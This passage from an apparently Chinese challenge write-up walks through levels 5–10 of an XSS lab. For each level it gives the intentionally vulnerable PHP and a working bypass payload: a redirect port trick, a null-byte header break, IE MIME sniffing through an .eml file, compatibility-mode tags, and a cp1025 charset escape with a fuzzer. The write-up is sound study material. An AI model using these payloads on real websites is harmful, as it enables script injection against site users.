class="string">&quot;url&quot;</span>]);</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0d&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%0a&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span>.<span class="variable">$url</span>.<span class="string">&quot;&#x27;&gt;如果跳转失败请点我&lt;/a&gt;&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>核心任务就是阻止浏览器跳转，来一篇p牛82。。。啊不，16年的文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a>，里面几种阻止浏览器跳转的方式：</p>
<ol>
<li><p>使用<code>\0</code>，因为PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时<code>Location</code>头便不会返回，浏览器也就不会跳转了。但是这里过滤了<code>%00 </code>等，所以无法利用。</p>
</li>
<li><p>在PHP没有关闭<code>display_errors</code>的情况下，只要在header位置的前面某处构造一个错误，一旦有错误信息在header前被输出，header函数也就不会执行了——原因是我们不能在HTTP体已经输出的情况下再输出HTTP头。似乎也不太适合这道题。</p>
</li>
<li><p>FF下，使用csp禁止iframe跳转</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: frame-src http://localhost:8081/&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;iframe src=<span class="string">&quot;http://localhost:8081/?path=http://www.baidu.com/%0a%0dX-XSS-Protection:0%0a%0d%0a%0d&lt;script&gt;alert(location.href)&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>题目中过滤了%0a、%0d，这种方法也就失效了。</p>
</li>
<li><p>FF下，将跳转url的端口设为&lt;80</p>
<p>利用这个可以解决这个题。payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss5.php?url=http://baidu.com:0/&#x27;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&lt;a&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="6-强制下载"><a href="#6-强制下载" class="headerlink" title="6 强制下载"></a>6 强制下载</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    强制下载</span></span><br><span class="line"><span class="comment">    hint: 有些Security feature也会坑队友</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">  <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">4</span>) ===<span class="string">&quot;http&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://0&quot;</span> &amp;&amp; 		           <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://1&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://l&quot;</span> &amp;&amp;                 <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>], <span class="string">&#x27;@&#x27;</span>) === <span class="literal">false</span></span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//读取指定url的内容，由于前面设置了http头，所以读取到的内容不会直接显示出来</span></span><br><span class="line">    <span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span> =&gt;</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_redirects&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;ignore_errors&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$opts</span>);</span><br><span class="line">    <span class="variable">$url</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$stream</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Bad URL!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面设置了下载的http头，然后读取指定URL中的内容，写入文件并下载到本地。我们需要<strong>绕过文件下载</strong>这个地方，让服务端读取的内容直接显示出来。说白了也是阻止浏览器跳转，这里我们用到第5题的第一种姿势：</p>
<p>使用<code>\0</code>，因为PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时<code>Location</code>头便不会返回，浏览器也就不会跳转了。但是这里过滤了<code>%00</code>，所以无法利用。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://seaii-blog.com:8000/xss6.php?url=http://xx.com/xss6.html&amp;filename=aa%00</span><br></pre></td></tr></table></figure>

<p>xss6.html的内容为<code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
<h3 id="7-text-x2F-plain"><a href="#7-text-x2F-plain" class="headerlink" title="7 text&#x2F;plain"></a>7 text&#x2F;plain</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    text/plain</span></span><br><span class="line"><span class="comment">    hint: MIME Sniffing</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/plain; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line">    <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">4</span>) ===<span class="string">&quot;http&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://0&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://1&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://l&quot;</span> &amp;&amp; </span><br><span class="line">    <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>], <span class="string">&#x27;@&#x27;</span>) === <span class="literal">false</span></span><br><span class="line">  ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span> =&gt;</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_redirects&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;ignore_errors&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$opts</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$stream</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Bad URL!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>重点就是这个http头</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/plain; charset=utf-8&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>由于设置了这个http头，获取到的内容即使是html代码，浏览器也不会解析，直接输出到页面上，我们要做的就是绕过这个头，利用的还是ie（ie:又是我…）的MIME Sniffing。</p>
<p>利用方法在这儿：<a target="_blank" rel="noopener" href="https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/">https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/</a></p>
<p>payload构造起来就很简单了：</p>
<p>xss7.eml</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TESTEML</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line"></span><br><span class="line">=3Ciframe=20src=3D=27http=3A=2f=2f127.0.0.1=2fali_xss_challenge=2fxss7.php=3Furl=3Dhttp=3A=2f=2fseaii-blog.com=3A8000=2f7.txt=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E</span><br></pre></td></tr></table></figure>

<p>7.txt: <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
<p>防御：</p>
<blockquote>
<p>文章中的<code>X-Content-Type-Options: nosniff</code>是可以防御的，相反<code>X-Frame-Options: DENY</code>并不能从根本去解决这个问题，这个只是防御了一种攻击方式，但是漏洞点却还在。</p>
</blockquote>
<h3 id="8-标签"><a href="#8-标签" class="headerlink" title="8 标签"></a>8 标签</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    标签</span></span><br><span class="line"><span class="comment">    hint: 尖括号后面能跟些什么？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">4</span>) === <span class="string">&quot;http&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://0&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://1&quot;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>],<span class="number">0</span>,<span class="number">8</span>)&lt;&gt;<span class="string">&quot;http://l&quot;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>], <span class="string">&#x27;@&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$rule</span> = <span class="string">&quot;/&lt;[a-zA-Z]/&quot;</span>;</span><br><span class="line">    <span class="variable">$opts</span> = <span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span> =&gt;</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_redirects&#x27;</span> =&gt; <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;ignore_errors&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$opts</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$url</span>, <span class="string">&#x27;r&#x27;</span>, <span class="literal">false</span>, <span class="variable">$context</span>);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$stream</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$rule</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;XSS Detected!&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Bad URL!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据提示和代码，我们要找&lt;后面可以跟的非字母的字符。</p>
<p>ie9、10有这样一个payload，但是在ie11中失效了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% contenteditable onresize=alert(document.domain)&gt;</span><br></pre></td></tr></table></figure>

<p>但是可以通过<code>x-ua-compatible</code>设置文档兼容性，让它也能够兼容IE9、10的内容，还有一个很重要的点：</p>
<p><strong>即便iframe内页面和父窗口即便不同域，iframe内页面也会继承父窗口的兼容模式，所以IE的一些老技巧、特性可以通过此方法去复活它。</strong></p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">x-ua-compatible</span> <span class="attr">content</span>=<span class="string">IE</span>=<span class="string">9</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/ali_xss_challenge/xss8.php?url=http://seaii-blog.com:8000/8.txt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>8.txt内容就是上面的payload。</p>
<h3 id="9-plaintext（-）"><a href="#9-plaintext（-）" class="headerlink" title="9 plaintext（***）"></a>9 plaintext（***）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    plaintext</span></span><br><span class="line"><span class="comment">    hint: 字符集</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=gb3212&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码不多但绝对劲爆的一道题。。。</p>
<p>本来想的是找一个优先级比plaintext还高的标签来截断它，然而并没有，看了提示，发现是通过字符集差异来逃逸。</p>
<p>我们有时候在使用浏览器的时候，也会遇到编码不同导致乱码问题，这个问题主要在于服务端和客户端之间的字符集存在差异导致的。</p>
<p>详细看这篇文章<a target="_blank" rel="noopener" href="https://www.ibm.com/developerworks/cn/web/wa-lo-ecoding-response-problem/index.html">深入分析 web 请求响应中的编码问题</a></p>
<p>上面的由于两端的差别导致的乱码，从xss角度出发，我们也就只能分析客户端 所以问题来了：<strong>http的响应头的编码、页面的meta等都可以设置头的东西，那么具体是什么时候具体对应的会起作用?</strong></p>
<ol>
<li>ua里面已经确认指明了才会选择。 </li>
<li>第二个是http响应头大编码设置，也就是<code>Content-Type</code>，当它设置了<code>charset</code><strong>并且</strong>支持这个<code>charset</code>，也就是不为空并且字符集是存在的。</li>
<li><strong>第三个就是如果meta标签设置编码是在html前1024个字节的时候，浏览器会根据这个编码去解析，这个是浏览器直接解析，完全是不受<code>plaintext</code>影响</strong></li>
</ol>
<p>我们注意到题目的编码是不存在的编码<code>GB3212</code>，所以符合第三种情况。那么我们要做的：</p>
<p>第一步，利用meta改变页面字符集。</p>
<p>第二步，利用字符集之间的差异，寻找异类的字符集，这里使用的是<code>cp1025</code>编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss9.php?text=&lt;meta http-equiv=&quot;content-Type&quot; content=&quot;text/html; charset=cp1025&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170907/F8DF4dd1dG.png" alt="mark"></p>
<p>可以看到plaintext消失了，但是这种方法<strong>仅能用于ie</strong>。</p>
<p>第三步，确认异类字符集的编码表，这里直接贴lemon大佬的代码了。</p>
<p>fuzz.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=gb3212&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;safe_mode&#x27;</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=gb3212&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;/body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex_pad</span>(<span class="params">int_</span>)</span>&#123;</span><br><span class="line">    hex_ = int_.<span class="title function_ invoke__">toString</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span>(hex_.length==<span class="number">1</span>)&#123;</span><br><span class="line">        hex_ = <span class="string">&#x27;0&#x27;</span>+hex_;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex_;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">255</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> id = <span class="string">&#x27;id_&#x27;</span>+<span class="title function_ invoke__">hex_pad</span>(i);</span><br><span class="line">    <span class="keyword">var</span> divO = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;div&#x27;</span>); </span><br><span class="line">    divO.id = id;</span><br><span class="line">    divO.innerHTML = <span class="title function_ invoke__">hex_pad</span>(i);</span><br><span class="line">    document.body.<span class="title function_ invoke__">appendChild</span>(divO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> iframea = document.<span class="title function_ invoke__">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>); </span><br><span class="line">    iframea.src= <span class="string">&#x27;http://a.com/test/xss/xsschange/9/game.php?text=&#x27;</span>+<span class="string">&quot;%&quot;</span>+<span class="title function_ invoke__">hex_pad</span>(i);</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(id).<span class="title function_ invoke__">appendChild</span>(iframea);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>还需要一个game.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=cp1025&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> @<span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzz后得到payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss9.php?text=&lt;meta http-equiv=&quot;content-Type&quot; content=&quot;text/html; charset=cp1025&quot;&gt;%4c%89%94%87%01%a2%99%83%7e%f1%01%96%95%85%99%99%96%99%7e%81%93%85%99%a3%4d%f1%5d%0b%6e</span><br></pre></td></tr></table></figure>

<p> 测试没有成功。。。</p>
<h3 id="10-MVM"><a href="#10-MVM" class="headerlink" title="10 MVM"></a>10 MVM</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MVM</span><br><span class="line">hint: Client Side Template Injection</span><br><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.6.5/angular.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;input id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> tabindex=<span class="string">&quot;1&quot;</span> ng-model=<span class="string">&quot;username&quot;</span> ng-init=<span class="string">&quot;username=&#x27;&lt;?php if(strlen(<span class="subst">$_GET</span>[&quot;</span>username<span class="string">&quot;])&lt;37)&#123;echo htmlspecialchars(<span class="subst">$_GET</span>[&quot;</span>username<span class="string">&quot;]);&#125;?&gt;&#x27;&quot;</span> placeholder=<span class="string">&quot;username&quot;</span> maxlength=<span class="string">&quot;11&quot;</span> type=<span class="string">&quot;text&quot;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>AngularJS？模板注入？前几天刚刚收集了姿势！1.6.5的？emmmmm……</p>
